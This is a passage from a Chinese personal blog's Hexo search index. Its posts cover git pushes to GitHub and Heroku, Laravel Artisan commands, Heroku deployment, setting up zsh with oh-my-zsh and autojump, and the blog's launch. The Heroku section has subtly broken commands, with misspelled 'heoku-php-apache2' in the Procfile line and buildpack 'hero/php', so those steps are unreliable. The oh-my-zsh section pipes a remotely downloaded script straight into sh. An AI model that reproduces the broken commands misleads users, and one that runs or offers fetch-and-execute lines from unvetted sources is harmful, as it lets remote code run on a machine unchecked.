</code></pre><h5 id="10-代码推送"><a href="#10-代码推送" class="headerlink" title="10.代码推送"></a>10.代码推送</h5><p><strong>(1)推送到 GitHub 上</strong></p>
<pre><code>git remote add origin git@github.com:your_username/hello_laravel.git
git push origin master
</code></pre><p><strong>第一条命令的意思是：在我们的 GitHub 本地仓库添加一个远程仓库，<code>git@github.com:your_username/hello_laravel.git</code> 是本地仓库的地址，使用ssh的方式连接。</strong></p>
<p><strong>第二条命令的意思是：将本地master分支跟踪到远程分支，即将我们的代码推送到 GitHub 本地仓库中。</strong></p>
<p><strong>这是第一次将代码推送到 GitHub上需要做的工作，因为需要建立远程仓库，之后我们对代码进行修改之后再一次推送只需要执行下列命令即可</strong></p>
<pre><code>git add -A
git commit -m &quot;describe&quot;
git push
</code></pre><p><strong>(2)推动到 Heroku 上</strong></p>
<pre><code>git push heroku master
</code></pre><p><strong><em>注：这只是在学习中总结的部分命令，在之后的学习中如果再遇到相关命令会继续补充</em></strong></p>
]]></content>
      
        <categories>
            
            <category> Laravel 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Laravel Artisan 命令行操作的介绍]]></title>
      <url>/2017/08/05/Laravel%20Artisan/</url>
      <content type="html"><![CDATA[<h3 id="Laravel-Artisan-命令"><a href="#Laravel-Artisan-命令" class="headerlink" title="Laravel Artisan 命令"></a>Laravel Artisan 命令</h3><h4 id="0x01-Artisan-介绍"><a href="#0x01-Artisan-介绍" class="headerlink" title="0x01 Artisan 介绍"></a>0x01 Artisan 介绍</h4><p><strong>Artisan 是 Laravel 提供的 CLI(命令行接口)，它提供了非常多使用的命令来帮助我们开发 Laravel 应用</strong></p>
<h4 id="0x02-Artisan-命令介绍"><a href="#0x02-Artisan-命令介绍" class="headerlink" title="0x02 Artisan 命令介绍"></a>0x02 Artisan 命令介绍</h4><p><strong>1.生成App Key</strong></p>
<pre><code>php artisan key:generate
</code></pre><p><strong>2.生成控制器</strong></p>
<pre><code>php artisan make:controller
</code></pre><p><strong>3.生成模型</strong></p>
<pre><code>php artisan make:model
</code></pre><p><strong>4.生成授权策略</strong></p>
<pre><code>php artisan make:policy
</code></pre><p><strong>5.生成seeder文件</strong></p>
<pre><code>php artisan make:seeder
</code></pre><p><strong>6.执行迁移</strong></p>
<pre><code>php artisan migrate
</code></pre><p><strong>7.回滚迁移</strong></p>
<pre><code>php artisan migrate:rollback
</code></pre><p><strong>8.重置数据库</strong></p>
<pre><code>php artisan migrate:refresh
</code></pre><p><strong>9.填充数据库</strong></p>
<pre><code>php artisan db:seed
</code></pre><p><strong>10.进入tinker环境</strong></p>
<pre><code>php artisan tinker
</code></pre><p><strong>11.查看路由列表</strong></p>
<pre><code>php artisan route:list
</code></pre><p><strong>12.使用 <code>help</code> 来查看各个 Artisan 命令的帮助界面</strong></p>
<pre><code>php artisan help xxx
</code></pre><p><strong><em>注：由于还在学习，只是总结了一些基础的命令，在今后的学习中要是再遇到相关的命令还会继续的学习</em></strong></p>
]]></content>
      
        <categories>
            
            <category> Laravel 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Artisan </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Heroku 命令行操作的介绍]]></title>
      <url>/2017/08/05/heroku/</url>
      <content type="html"><![CDATA[<h3 id="Heroku-命令"><a href="#Heroku-命令" class="headerlink" title="Heroku 命令"></a>Heroku 命令</h3><h4 id="0x01-Heorku-介绍"><a href="#0x01-Heorku-介绍" class="headerlink" title="0x01 Heorku 介绍"></a>0x01 Heorku 介绍</h4><p><strong>最近在学习 Laravel 相关的开发知识，当然知识简单的涉及一点，前端什么的还真是不怎么了解，但是还是想熟悉一下开发的整体流程，大致的学习一下，在接触的过程中发现基础的代码部署全部都是由命令行进行操作的，其中就包括 <code>Heroku</code> 的命令号操作。那么 <code>Heroku</code> 又是什么呢？</strong></p>
<p><strong>Heroku 是一个支持多种语言的云平台。Heroku 作为最开始的云平台之一，从 2007 年 6 月起开始开发，当时它仅支持 Ruby，后来增加了对 Java、Node.js、Scala、Clojure、Python 以及 PHP 和 Perl 的支持。由于其应用部署流程异常简单，因此倍受广大开发者欢迎。</strong></p>
<p><strong>在开发过程中，可以使用 Heroku 方便地进行项目的云部署。</strong></p>
<h4 id="0x02-Heroku-命令介绍"><a href="#0x02-Heroku-命令介绍" class="headerlink" title="0x02 Heroku 命令介绍"></a>0x02 Heroku 命令介绍</h4><h5 id="1-登录命令"><a href="#1-登录命令" class="headerlink" title="1.登录命令"></a>1.登录命令</h5><p><strong>(1)登录 Heroku 账号</strong></p>
<pre><code>heroku login
</code></pre><p><strong>(2)添加 SSH Key 到 Heroku 上</strong></p>
<pre><code>heroku keys:add
</code></pre><h5 id="2-上线命令"><a href="#2-上线命令" class="headerlink" title="2.上线命令"></a>2.上线命令</h5><p><strong>(1)创建一个 Heroku App</strong></p>
<pre><code>heroku create
</code></pre><p><strong>(2)配置 <code>Procfile</code> 文件</strong></p>
<p><strong>通过配置 <code>Procfile</code> 文件来告诉 Heroku 应当使用什么命令来启动 Web 服务器。接着还需要将该文件纳入到 Git 版本控制中</strong></p>
<pre><code>echo web: vendor/bin/heoku-php-apache2 public/ &gt; Procfile
git add -A
git commit -m &quot;Procfile for Heroku&quot;
git push
heroku buildpacks:set hero/php
</code></pre><p><strong>(3)生成 App Key</strong></p>
<pre><code>php artisan key:generate
</code></pre><p><strong>将生成的 App Key 替换掉下面命令的 <your_app_key> 并运行命令</your_app_key></strong></p>
<pre><code>heroku config:set APP_KEY=&lt;your_app_key&gt;
</code></pre><p><strong>(4)配置基本完成，将代码推送到 Heroku 上</strong></p>
<pre><code>git push heroku master
</code></pre><p><strong>(5)推送成功后，快速打开线上应用</strong></p>
<pre><code>heroku open   
</code></pre><h5 id="3-出现了问题"><a href="#3-出现了问题" class="headerlink" title="3.出现了问题"></a>3.出现了问题</h5><p><strong>在使用 Heroku 的过程中如果出现了问题，则可以使用下面命令来输出生产环境上的日志进行排错</strong></p>
<pre><code>heroku logs
</code></pre><p><strong><em>注：这些只是我总结的部分命令，在之后的学习当中如果遇到有关 Heroku 的命令行操作会进行及时的补充</em></strong></p>
]]></content>
      
        <categories>
            
            <category> Laravel 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Heroku </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[好用的Shell--ZSH]]></title>
      <url>/2017/07/29/zsh/</url>
      <content type="html"><![CDATA[<h3 id="ZSH的安装与配置"><a href="#ZSH的安装与配置" class="headerlink" title="ZSH的安装与配置"></a>ZSH的安装与配置</h3><h4 id="1-Shell的介绍"><a href="#1-Shell的介绍" class="headerlink" title="1.Shell的介绍"></a>1.Shell的介绍</h4><p><strong>在Mac或者Linux系统中最不可或缺的应该就是命令行了，而使用命令行当然就离不开shell了，那么shell是什么呢？</strong></p>
<p><strong>shell是Linux/Unxi的一个外壳，shell负责与内核进行交互，接收用户或其他应用程序的命令，然后把这些命令转化成内核能理解的语言，传给内核，内核再进行命令的处理和执行，处理执行完后再将结果返回给用户或应用程序</strong></p>
<p><strong>Linux/Unxi提供多种shell，如bash、csh、sh、zsh等，如果想要查看你的系统中有多少种shell，执行如下命令：</strong></p>
<pre><code>cat /etc/shells
</code></pre><p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh02zsh1.png" alt="1"></p>
<h4 id="2-ZSH的安装"><a href="#2-ZSH的安装" class="headerlink" title="2.ZSH的安装"></a>2.ZSH的安装</h4><p><strong>zsh也是shell的一种，Linux和Mac不同的地方在于：Mac下预装了zsh，而Linux/Unxi下并没有需要自行安装，所以如果你是Mac用户，那么你的zsh就不需要安装了，如果你是Linux或Unxi用户就需要先行安装zsh，具体操作如下：</strong></p>
<p><strong>Redhat Linux用户执行</strong></p>
<pre><code>sudo yum install zsh
</code></pre><p><strong>Ubuntu Linux用户执行</strong></p>
<pre><code>sudo apt-get install zsh
</code></pre><p><strong>安装完之后，我们还需要将zsh设置成我们默认的shell，以代替原来使用的shell，之后在终端执行如下命令</strong></p>
<pre><code>chsh -s /bin/zsh
</code></pre><p><strong><em>注:这一步主要看zsh的路径，如果路径不是’/bin/zsh’而是’/usr/local/bin/zsh’，在执行命令是路径就要改变</em></strong></p>
<h4 id="3-oh-my-zsh的安装"><a href="#3-oh-my-zsh的安装" class="headerlink" title="3.oh-my-zsh的安装"></a>3.oh-my-zsh的安装</h4><p><strong>zsh之所以现在被大众接受是因为zsh可配置性强，用户可以自定义配置，个性化强，而且zsh有着极其强大的tab不全功能；但是在zsh初期却很少有人愿意使用它，因为zsh的配置相当复杂使许多人望而却步。</strong></p>
<p><strong>但是国外有一位大牛写出了一个项目使得Zsh的配置变得很简单只需要几步就可以完成，这个项目就是“oh-my-zsh”</strong></p>
<p><strong>接下来安装oh-my-zsh，oh-my-zsh可以自动安装或者手动安装</strong></p>
<p><strong>自动安装</strong></p>
<pre><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
</code></pre><p><strong>手动安装</strong></p>
<pre><code>git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh

cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
</code></pre><p><strong>这样oh-my-zsh就算安装完成了，现在在打开终端，你的shell就变成了zsh的天下了～</strong></p>
<p><strong>zsh的配置几乎全在~/.zshrc文件下,如果想对shell进行进一步的配置或进行美化就都需要在~/.zshrc文件下进行了</strong></p>
<p><strong>oh-my-zsh社区非常的完善，有200+的插件，140+的主题，你可以在社区中找到你需要的插件和你喜爱的主题，当然如果你需要的插件主题社区中并没有你也可以自己试着去写一些，将zsh配置修改成自己喜欢的样子。一款优秀的项目，其优秀之处就在于他功能是强大的、可扩展的。这样配置过后，没给人的zsh可能都不一样，没给人都能找到最适合自己的shell～</strong></p>
<h3 id="ZSH的使用"><a href="#ZSH的使用" class="headerlink" title="ZSH的使用"></a>ZSH的使用</h3><p><strong>1、兼容 bash，原来使用bash的，现在可以无压力使用zsh</strong></p>
<p><strong>2、强大的历史纪录功能，输入 grep 然后用上下箭头可以翻阅你执行的所有 grep 命令。</strong></p>
<p><strong>3、智能拼写纠正</strong></p>
<p><strong>4、补全功能强大：路径补全、命令补全，命令参数补全，插件内容补全等等。</strong></p>
<p><strong>5、智能跳转，安装了autojump之后，zsh 会自动记录你访问过的目录，通过 j + 目录名 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全。j –stat 可以看你的历史路径库。</strong></p>
<p><strong>6、目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转。</strong></p>
<p><strong>7、在当前目录下输入 .. 或 … ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。</strong></p>
<p><strong>8、通配符搜索</strong></p>
<p><strong>9、更强的别名</strong></p>
<p><strong>10、插件支持</strong></p>
<p><strong><em>注：有些使用的优点不太会描述就借鉴了一些牛人的文章，具体的使用优点可以看下链接:<a href="https://zhuanlan.zhihu.com/p/19556676?columnSlug=mactalk" target="_blank" rel="external">终极 Shell——ZSH</a></em></strong></p>
<h3 id="ZSH的插件"><a href="#ZSH的插件" class="headerlink" title="ZSH的插件"></a>ZSH的插件</h3><p><strong>zsh下载插件时需要注意的一点是：下载好插件后一定要在~/.zshrc文件中进行配置，要将插件的名字填写套配置文件的plugins选项中</strong></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh02zsh2.png" alt="2"></p>
<p><strong>主要介绍一款插件：autojump，此插件使得zsh的功能更加强大，它会在你每次启动命令时记录你当前位置，并把它添加进它自身的数据库中。这样，某些目录比其它一些目录添加的次数多，这些目录一般就代表你最重要的目录，而它们的“权重”也会增大</strong></p>
<p><strong>下面介绍如何下载autojump及其配置：</strong></p>
<p><strong>1.如果你是Mac用户，使用homebrew下载安装autojump</strong></p>
<pre><code>brew install autojump
</code></pre><p><strong>2.如果你是Linux用户，下载autojump</strong></p>
<pre><code>wget https://github.com/downloads/joelthelion/autojump/autojump_v21.1.2.tar.gz
</code></pre><p><strong>下载完后解压缩，解压缩完后，进入目录，执行</strong></p>
<pre><code>./install.sh
</code></pre><p><strong>3.进入.zshrc文件，将下面代码加入</strong></p>
<pre><code>[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh
</code></pre><p><strong>4.执行命令</strong></p>
<pre><code>source ~/.zshrc
</code></pre><h3 id="ZSH的主题"><a href="#ZSH的主题" class="headerlink" title="ZSH的主题"></a>ZSH的主题</h3><p><strong>oh-my-zsh社区提供了非常多的主题供用户进行选择，使用主题也非常的方便，我会在下面附上一个详细的配置主题链接供大家参考</strong></p>
<p><strong><em><a href="https://zhuanlan.zhihu.com/p/26373052" target="_blank" rel="external">mac下oh-my-zsh的配置</a></em></strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>zsh这款shell是我最近自己安装配置完成，并经过了一段时间的时间后，觉得zsh真的强大好用，真心推荐给大家使用。</strong></p>
<p><strong>安装配置zsh、oh-my-zsh以及安装配置插件和主题时我也遇到了很多的问题，最后这些问题也被我一一的解决，并把经验与体会写了下来和大家分享，我觉得当一个问题出现了，你自己去解决时，要注重解决问题的过程，遇到问题多思考，多查找资料，尽量通过自己去解决问题，这才是最重要的～～</strong></p>
]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> zsh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[yzczzh]]></title>
      <url>/2017/07/28/yzczzh/</url>
      <content type="html"><![CDATA[<p><strong>终于建好了属于自己的博客，感觉很不错，一直想建一个自己的博客记录自己的学习经历和心得体会，由于种种原因一直拖延到现在，终于建立起来了~</strong></p>
<p><strong>博客是使用HEXO + GitHub搭建起来的，搭建起来很方便，选模板和修改模板花了好长时间，但是做出来的效果还是不错的，感觉辛苦没有白费，HEXO + GitHub的命令行操作也非常的方便，创建文档，部署就可以通过很简单的几个命令就可以实现；主题的选择和改进网上也有详细的教程(但是有些主题需要用到的插件中的某些方法node.js已经放弃使用了，这些地方需要注意)</strong></p>
<p><strong>虽然花了很长时间但是也学会了很多，博客搭建起来之后，我也会陆陆续续的更新自己的博客，让博客记录我的学习历程和经验~</strong></p>
<p><strong>下面会附上我在搭建博客时借鉴的文章及查阅的资料，还要感谢<a href="http://www.z1blog.com" target="_blank" rel="external">zil0ng师傅</a>的帮助，他的博客也在我的友链中，大家可以去浏览，谢谢大家，希望大家多多关注，我也会及时努力的更新，让所有人也让自己看到我的进步~</strong></p>
<p><strong><em>1.建站链接</em></strong><br><a href="http://blog.csdn.net/qq_30379689/article/details/52854003" target="_blank" rel="external">Mac下使用Hexo搭建个人博客</a></p>
<p><strong><em>2.主题链接</em></strong></p>
<p><a href="http://blog.csdn.net/chwshuang/article/details/52350463" target="_blank" rel="external">Hexo安装主题</a></p>
<p><a href="https://hexo.io/themes/" target="_blank" rel="external">Themes</a></p>
]]></content>
      
        <categories>
            
            <category> 日常 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
        
    </entry>
    
  
  
    
    <entry>
      <title></title>
      <url>/baidu_verify_47W5NBJloK.html</url>
      <content type="html"><![CDATA[47W5NBJloK]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[关于]]></title>
      <url>/about/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[friends]]></title>
      <url>/friends/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[photo]]></title>
      <url>/photo/index.html</url>
      <content type="html"></content>
    </entry>
    
  
</search>
